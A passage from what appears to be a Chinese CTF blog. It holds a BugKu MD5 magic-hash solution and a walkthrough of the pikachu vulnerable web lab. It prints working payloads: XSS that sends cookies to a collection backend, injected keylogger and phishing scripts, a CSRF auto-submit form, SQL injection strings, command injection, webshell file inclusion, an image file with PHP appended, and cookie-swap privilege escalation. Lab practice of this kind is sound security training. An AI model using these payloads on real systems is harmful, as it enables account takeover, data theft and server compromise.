<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1和key2的md5值相等但二者不恒等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p><p>介绍一批md5是0e开头的字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场刷题记录</title>
      <link href="/2022/04/21/pikachu/"/>
      <url>/2022/04/21/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-pikachu靶场记录"><a href="#CTF-Web-pikachu靶场记录" class="headerlink" title="CTF Web pikachu靶场记录"></a>CTF Web pikachu靶场记录</h1><blockquote><p>简单记录下pikachu靶场刷题历程</p><p>参考资料：</p><p><a href="https://www.bilibili.com/video/BV1Qh411D7mN?share_source=copy_web">全程讲解视频</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/107880269?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165020809116780255213643%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165020809116780255213643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107880269.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu&spm=1018.2226.3001.4187">pikachu靶场wp2</a></p></blockquote><h2 id="靶场环境配置"><a href="#靶场环境配置" class="headerlink" title="靶场环境配置"></a>靶场环境配置</h2><blockquote><p>可以参照本篇博客：<a href="https://www.webxlab.net/article/detail/OmAE5oMAar">https://www.webxlab.net/article/detail/OmAE5oMAar</a></p></blockquote><p>初始界面如下：</p><p><img src="https://s2.loli.net/2022/04/21/UPZhWdKINOnD8V7.png" alt="brief_intro.png"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>使用burp suite即可</p><p>burpsuite无法拦截本地包：<a href="https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>使用intruder模块即可</p><h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>验证码不过期 </p><h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>直接爆破</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>token可以获取并放入下一次爆破 注意选择合适的爆破方式（pitchfork）</p><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><h3 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h3><p>输入一些特殊字符试一下 如果有输入字符限制（前端），可F12直接修改限制值</p><h3 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h3><p>登陆后输入payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>先特殊字符试下，然后输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>构造payload替换掉”+str+”，payload为#’ onclick &#x3D; “alert(‘evolution’)”&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br></pre></td></tr></table></figure><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick = &quot;alert(&#x27;evolution&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页后缀改为admin_login.php，查看信息</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27;onclick=&#x27;alert(1111)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/TNlce25h3JUnP71.png" alt="xss_htmlspecialchars.png"></p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;evolution&#x27;)</span><br></pre></td></tr></table></figure><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">e&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pikachu-Xss-后台"><a href="#pikachu-Xss-后台" class="headerlink" title="pikachu Xss 后台"></a>pikachu Xss 后台</h2><p>pkxss后台：</p><p><a href="http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php">http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php</a></p><h3 id="cookie搜集"><a href="#cookie搜集" class="headerlink" title="cookie搜集"></a>cookie搜集</h3><h4 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h4><p>在反射型xss（get）中输入payload（注意取消前端字符长度的限制）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1:8081/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%3A8081%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure><p>还可以更改一下，让他继续跳转到正常界面（伪装一下）</p><p>修改pikachu\pkxss\xcookie\cookie.php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:8081/pikachu/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br></pre></td></tr></table></figure><h4 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure><p>注意修改pikachu\pkxss\xcookie\post.html文件中的两个地址链接</p><h4 id="cookie后台信息"><a href="#cookie后台信息" class="headerlink" title="cookie后台信息"></a>cookie后台信息</h4><p><img src="https://s2.loli.net/2022/04/21/BImJ45QWKCT7vnD.png" alt="xss_cookie.png"></p><h3 id="钓鱼结果"><a href="#钓鱼结果" class="headerlink" title="钓鱼结果"></a>钓鱼结果</h3><p>修改pikachu\pkxss\xfish\fish.php中的链接地址（其中的空格要去掉）</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/He3G9hPEsKyVR5c.png" alt="xss_fish.png"></p><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>修改pikachu\pkxss\rkeypress\rk.js中第54行地址链接</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/ZQKcLsS3tBixVwq.png" alt="xss_keyboard.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>若进入编辑页面提示<code>MYSQL_ASSOC</code>警告，将pikachu\vul\csrf\csrfget\csrf_get_edit.php文件中的MYSQL_ASSOC修改为MYSQLI_ASSOC即可(<strong>各个题目中相同报错同理</strong>)</p><blockquote><p>参考：<a href="https://blog.csdn.net/mastergu2/article/details/107904129">https://blog.csdn.net/mastergu2/article/details/107904129</a></p></blockquote><p>观察流量包：</p><p><img src="https://s2.loli.net/2022/04/21/vkdSNTHtz4mLoPK.png" alt="csrf_get.png"></p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=earth&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>构造post.html即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>url构造为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/post.html</span><br></pre></td></tr></table></figure><blockquote><p>参考博客：<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p></blockquote><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>很好的防御CSRF攻击的方法。</p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>传入参数修改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/e6lwziJvnFQqxbo.png" alt="sql_post.png"></p><h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1-- </span><br></pre></td></tr></table></figure><p>注意第二个payload最后有个空格</p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e%&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e&#x27;) or 1=1#</span><br></pre></td></tr></table></figure><h3 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><blockquote><p>基于报错的注入可利用的3个函数：</p><ul><li>updatexml()</li><li>extractvalue()</li><li>floor()</li></ul></blockquote><h4 id="insert（注册）"><a href="#insert（注册）" class="headerlink" title="insert（注册）"></a>insert（注册）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h4 id="update（修改）"><a href="#update（修改）" class="headerlink" title="update（修改）"></a>update（修改）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p>payload需要使用url编码一下</p><p><img src="https://s2.loli.net/2022/04/21/otBxdq4lAe7hgw5.png" alt="sql_delete.png"></p><h3 id="“httpheader”注入"><a href="#“httpheader”注入" class="headerlink" title="“httpheader”注入"></a>“httpheader”注入</h3><h4 id="修改user-agent"><a href="#修改user-agent" class="headerlink" title="修改user-agent"></a>修改user-agent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/UZHLIDRql5PCo4O.png" alt="sql_useragent.png"></p><h4 id="修改cookie"><a href="#修改cookie" class="headerlink" title="修改cookie"></a>修改cookie</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/chIJ62TEu4ziW3w.png" alt="sql_cookie.png"></p><h3 id="盲注（based-on-boolian）"><a href="#盲注（based-on-boolian）" class="headerlink" title="盲注（based on boolian）"></a>盲注（based on boolian）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><h3 id="盲注（based-on-time）"><a href="#盲注（based-on-time）" class="headerlink" title="盲注（based on time）"></a>盲注（based on time）</h3><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/QN9yJxcgIF6P1AS.png" alt="sql_time.png"></p><p>发现存在注入点，输入payload进行盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p>若延迟时间有5s则database第一个字符为p，否则字符不对应。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/aAp3moSsrUJYe7M.png" alt="sql_widebyte.png"></p><blockquote><h4 id="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"><a href="#除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。" class="headerlink" title="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"></a>除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。</h4></blockquote><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="exec（ping）"><a href="#exec（ping）" class="headerlink" title="exec（ping）"></a>exec（ping）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure><h3 id="exec（eval）"><a href="#exec（eval）" class="headerlink" title="exec（eval）"></a>exec（eval）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8081/pikachu/test/yijuhua.txt&amp;submit=提交查询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</span><br></pre></td></tr></table></figure><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><h3 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/unsafedownload/execdownload.php?filename=../../../wiki/image/title.png</span><br></pre></td></tr></table></figure><h2 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe fileupload"></a>unsafe fileupload</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>前端限制，删除检查函数即可</p><p><img src="https://s2.loli.net/2022/04/21/rLMYNFlORvZIS7h.png" alt="upload_client.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>修改post请求的Content-Type字段即可</p><p><img src="https://s2.loli.net/2022/04/21/A8xYrzsbKuJPl7F.png" alt="upload_MIME.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>创建文件phpinfo.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建新图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy /b ai.png + phpinfo.php ccc.png</span><br></pre></td></tr></table></figure><p>上传文件后，获得文件保存位置，构造url访问即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/04/21/69033462610e99ca1b5084426014.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登陆后修改username即可查看任意用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录admin用户创建新用户，然后退出，burp抓取此次操作并放入repeater模块。</p><p>登录普通用户，通过burp获取cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=e6e5csjr6mdrmnuappdgi1c0qb</span><br></pre></td></tr></table></figure><p>将admin用户cookie替换为普通用户cookie并重新提交请求</p><p><img src="https://s2.loli.net/2022/04/21/4iRqaw9ZCJBeQzg.png" alt="overpermission_1.png"></p><p>可以看到，我们以普通用户身份使用admin用户权限添加了一个新用户</p><p><img src="https://s2.loli.net/2022/04/21/QeqwtoVcjYCk3OK.png" alt="overpermission_2.png"></p><h2 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="目录遍历"><a 